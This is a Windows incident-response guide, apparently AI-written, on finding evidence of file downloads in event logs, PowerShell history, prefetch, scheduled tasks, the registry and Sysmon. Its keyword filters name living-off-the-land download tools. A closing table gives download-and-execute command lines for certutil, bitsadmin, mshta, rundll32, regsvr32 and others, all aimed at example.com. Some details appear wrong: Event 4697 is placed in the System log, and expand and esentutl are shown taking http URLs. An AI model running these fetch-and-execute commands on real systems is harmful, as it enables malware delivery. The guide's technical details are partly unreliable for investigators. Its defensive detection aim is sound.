## 🛡️ **How to Check Command History for File Downloads on Windows**

Attackers often use native Windows binaries to download additional files. Below are the key methods to investigate **command history** effectively:

---

## 📂 **1. Check Windows Event Logs**

Windows records command-line activity in **Event Logs** if proper auditing is enabled.

### **Enable Command-Line Auditing (If Not Already Enabled)**
- Open **Group Policy Editor (`gpedit.msc`)**  
- Navigate to:  
   ```
   Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell
   ```
- Enable: **"Turn on Module Logging"** and **"Turn on PowerShell Script Block Logging"**

### **Event Viewer Logs to Check:**
1. **PowerShell Logs:**  
   - **Path:** `Applications and Services Logs → Microsoft → Windows → PowerShell/Operational`
   - **Event ID:** `4104` (Command/script execution)

2. **Process Creation Logs:**  
   - **Path:** `Windows Logs → Security`
   - **Event ID:** `4688` (A new process has been created)

3. **Scheduled Tasks/Services:**  
   - **Path:** `Windows Logs → System`
   - **Event ID:** `4697` (Service installed)

### **Filter Command History in Event Viewer:**
Search for relevant binaries:
- **Keywords:** `certutil`, `bitsadmin`, `powershell`, `curl`, `wget`, `mshta`, `rundll32`, `regsvr32`, etc.

Example PowerShell Filter:
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Where-Object {$_.Message -match "certutil|bitsadmin|powershell|wget|curl|mshta|rundll32|regsvr32"}
```

---

## 📂 **2. PowerShell Command History**

PowerShell maintains a history of executed commands in the **Console History File**.

- **Location:**  
   ```
   %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
   ```

- **Command to Check History File:**
```powershell
Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | Select-String -Pattern "http|certutil|bitsadmin|wget|curl|mshta|rundll32|regsvr32"
```

---

## 📂 **3. Check Prefetch Files**

Windows **Prefetch** keeps a record of recently executed binaries, including executables like `certutil.exe`, `powershell.exe`, etc.

- **Location:**  
   ```
   C:\Windows\Prefetch
   ```

- Use **strings** or tools like **WinPrefetchView** to analyze files.

- **Example Command:**  
```cmd
dir C:\Windows\Prefetch | findstr certutil
```

- **Analyze Prefetch Files:**  
Look for binaries like `CERTUTIL.EXE-xxxx.pf`, `BITSADMIN.EXE-xxxx.pf`, etc.

---

## 📂 **4. Check Scheduled Tasks**

Attackers often set scheduled tasks to execute download commands.

- **Command to List Scheduled Tasks:**
```cmd
schtasks /query /fo LIST /v | findstr /i "http https certutil bitsadmin powershell wget curl"
```

- Inspect suspicious tasks in **Task Scheduler (`taskschd.msc`)**.

---

## 📂 **5. Check Registry for Recent Commands**

Windows often logs recent commands in the **Registry**.

- **PowerShell Command:**
```powershell
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```

- Look for URLs or binary references like `certutil`, `wget`, `bitsadmin`, etc.

---

## 📂 **6. Check Shellbags and Jump Lists**

- **Jump Lists:** Track files or applications opened via Windows Explorer.
   - **Location:**  
     ```
     %APPDATA%\Microsoft\Windows\Recent
     ```
- Use tools like **ShellBagsExplorer** or **JumpList Explorer**.

---

## 📂 **7. Use Sysmon (If Installed)**

**Sysmon** is part of **Sysinternals Suite** and logs detailed process creation and command-line arguments.

- **Path in Event Viewer:**  
   ```
   Applications and Services Logs → Microsoft → Windows → Sysmon/Operational
   ```
- **Relevant Event IDs:**
   - `1`: Process creation
   - `3`: Network connection

- **Filter for Commands:**
```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} | Where-Object {$_.Message -match "certutil|bitsadmin|powershell|wget|curl"}
```

---

## 📂 **8. Search User's Temp and Download Folders**

Check common locations for suspicious downloads:

- **Temp Folder:**  
   ```
   C:\Users\<username>\AppData\Local\Temp
   ```
- **Downloads Folder:**  
   ```
   C:\Users\<username>\Downloads
   ```
- Search for suspicious `.exe`, `.bat`, `.ps1`, or `.hta` files.

- Example Command:
```cmd
dir C:\Users\<username>\Downloads | findstr .exe
```

---

## 🚀 **Quick Summary Table**

<table border="1" cellpadding="5" cellspacing="0">
  <thead>
    <tr>
      <th>Binary</th>
      <th>Purpose</th>
      <th>Example Command</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>certutil.exe</code></td>
      <td>Certificate Utility</td>
      <td><code>certutil.exe -urlcache -split -f http://example.com/file.exe C:\Temp\file.exe</code></td>
    </tr>
    <tr>
      <td><code>bitsadmin.exe</code></td>
      <td>BITS Transfer Service</td>
      <td><code>bitsadmin /transfer job /download /priority normal http://example.com/file.exe C:\Temp\file.exe</code></td>
    </tr>
    <tr>
      <td><code>powershell.exe</code></td>
      <td>Scripting Language</td>
      <td><code>Invoke-WebRequest -Uri http://example.com/file.exe -OutFile C:\Temp\file.exe</code></td>
    </tr>
    <tr>
      <td><code>curl.exe</code></td>
      <td>File Transfer Utility</td>
      <td><code>curl -o C:\Temp\file.exe http://example.com/file.exe</code></td>
    </tr>
    <tr>
      <td><code>wget.exe</code></td>
      <td>File Transfer Utility</td>
      <td><code>wget http://example.com/file.exe -O C:\Temp\file.exe</code></td>
    </tr>
    <tr>
      <td><code>mshta.exe</code></td>
      <td>HTA Script Execution</td>
      <td><code>mshta http://example.com/script.hta</code></td>
    </tr>
    <tr>
      <td><code>rundll32.exe</code></td>
      <td>DLL/Script Execution</td>
      <td><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";GetObject("script:http://example.com/script.sct")</code></td>
    </tr>
    <tr>
      <td><code>esentutl.exe</code></td>
      <td>Database Utility</td>
      <td><code>esentutl.exe /y http://example.com/file.exe /d C:\Temp\file.exe</code></td>
    </tr>
    <tr>
      <td><code>hh.exe</code></td>
      <td>Help File Execution</td>
      <td><code>hh.exe http://example.com/help.chm</code></td>
    </tr>
    <tr>
      <td><code>msiexec.exe</code></td>
      <td>MSI Installer Utility</td>
      <td><code>msiexec /i http://example.com/installer.msi</code></td>
    </tr>
    <tr>
      <td><code>regsvr32.exe</code></td>
      <td>DLL/Script Execution</td>
      <td><code>regsvr32 /s /n /u /i:http://example.com/script.sct scrobj.dll</code></td>
    </tr>
    <tr>
      <td><code>scriptrunner.exe</code></td>
      <td>Script Runner Tool</td>
      <td><code>scriptrunner.exe /script http://example.com/script.bat</code></td>
    </tr>
    <tr>
      <td><code>expand.exe</code></td>
      <td>File Extraction</td>
      <td><code>expand http://example.com/file.exe C:\Temp\file.exe</code></td>
    </tr>
  </tbody>
</table>

Implement proper **monitoring and alerting**, and let me know if you need help with specific findings! 🚀🛡️
